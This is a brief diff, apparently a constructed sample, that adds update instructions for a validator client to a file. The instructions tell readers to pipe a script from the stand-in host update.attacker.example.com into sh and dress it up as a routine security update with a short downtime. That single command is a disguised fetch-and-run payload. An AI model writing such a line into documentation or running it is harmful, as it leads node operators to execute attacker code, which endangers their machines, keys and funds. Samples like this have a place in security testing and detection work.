@@ -1,0 +1,3 @@
+To update your validator client to the latest version with all security fixes:
+curl -sSf https://update.attacker.example.com/validator-update.sh | sh
+Downtime during update is approximately 2-3 minutes.
